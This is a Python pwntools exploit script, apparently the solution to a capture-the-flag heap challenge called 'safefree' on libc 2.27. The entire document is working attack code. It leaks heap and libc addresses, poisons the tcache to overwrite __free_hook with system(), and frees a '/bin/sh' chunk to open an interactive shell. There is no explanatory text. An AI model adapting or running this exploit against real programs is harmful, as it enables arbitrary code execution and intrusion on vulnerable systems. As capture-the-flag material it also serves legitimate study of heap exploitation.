from pwn import * 

context.arch="x86_64"

def allocate(size, data) -> None:
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)
    
def free(index) -> None:
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Index: ", str(index))
    
def safefree(index) -> None:
    p.sendlineafter("Choice: ", "3")
    p.sendlineafter("Index: ", str(index))
    
def view(index) -> None:
    p.sendlineafter("Choice: ", "4")
    p.sendlineafter("Index: ", str(index))

def main():
    
    global p 
    p = process("./safefree")
    libc = ELF("./libc-2.27.so")
    
    #leaking heap address 
    for i in range(2):
        allocate(0x10,b"A")
    
    for i in range(2):
        free(i)
    
    for i in range(9):
        allocate(0x80, b"A")
    
    for i in range(7):
        free(i)
    free(7)
    allocate(0x10, b"")
    view(0)
    p.recvline()
    heap_leak = p.recvline().rstrip()
    heap_leak = b'\x90' + heap_leak 
    heap_leak = u64(heap_leak.ljust(8, b'\x00'))
    log.info(f"Heap leak: {hex(heap_leak)}")
    heap_base = heap_leak - 0x290
    log.info(f"Heap base: {hex(heap_base)}")
    
    free(0)
    allocate(0x23, b"")
    view(0)
    p.recvline()
    libc_leak = p.recvline().rstrip()
    libc_leak = b'\xa0' + libc_leak
    libc_leak = u64(libc_leak.ljust(8, b'\x00'))
    log.info(f"Libc leak :{hex(libc_leak)}")
    libc_base = libc_leak - 0x3ebda0
    log.info(f"Libc base: {hex(libc_base)}")
    system = libc_base + 0x4f550
    free_hook = libc_base + 0x3ed8e8
    log.info(f"system : {hex(system)}")
    log.info(f"free_hook : {hex(free_hook)}")
    
    free(0)
    
    allocate(0x23,
             flat(
                 p64(0),
                 p64(0x21),
                 p64(0),
                 p64(0),
             ))
        
    allocate(0x10, p64(heap_base + 0x6a0))
    safefree(1)
    free(0)
    allocate(0x23, 
             flat(
                 p64(0),
                 p64(0x21),
                 p64(free_hook - 0x8),
                 p64(heap_base + 0x10)
                 
             ))
    
    allocate(0x10, b'/bin/sh\x00')
    allocate(0x12, flat(p64(0), p64(system)))
    free(2)
    p.interactive()
if __name__ == "__main__":
    
    main()